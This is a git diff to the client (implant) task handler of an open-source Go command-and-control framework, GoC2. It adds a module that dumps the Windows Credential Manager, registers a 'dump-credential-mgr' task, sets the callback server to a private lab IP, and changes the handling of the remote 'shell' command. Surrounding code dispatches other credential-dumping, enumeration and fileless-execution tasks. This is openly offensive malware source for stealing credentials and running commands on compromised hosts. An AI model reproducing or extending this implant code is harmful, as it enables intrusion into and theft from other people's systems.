@@ -18,6 +18,7 @@ import (
 	"github.com/gorilla/websocket"
 	"github.com/latortuga71/GoC2/internal/data"
 	"github.com/latortuga71/GoC2/internal/modules/basic"
+	"github.com/latortuga71/GoC2/internal/modules/credentials/dumpcredman"
 	"github.com/latortuga71/GoC2/internal/modules/credentials/dumpprocess"
 	"github.com/latortuga71/GoC2/internal/modules/credentials/dumpsecrets"
 	"github.com/latortuga71/GoC2/internal/modules/enumeration/enumlocaluser"
@@ -76,7 +77,7 @@ var clientKey string
 var caCert string
 
 func init() {
-	ServerHostName = "0.0.0.0"
+	ServerHostName = "192.168.56.1"
 	ServerSecret = "Test"
 	CheckedIn = false
 	CheckedInChan = make(chan interface{})
@@ -289,7 +290,9 @@ func ClientHandleTask(message []byte) (error, *data.TaskResult) {
 	case "memfd_create":
 		result, cmdError = memfdcreate.MemfdCreate(t.File, t.Args[0])
 	case "shell":
-		result, cmdError = basic.ShellCommand(t.Args)
+		result, cmdError = basic.ShellCommand(t.Args[0])
+	case "dump-credential-mgr":
+		result, cmdError = dumpcredman.DumpCredman(t.Args[0])
 	default:
 		result, cmdError = "", errors.New("Command Not Found.")
 	}
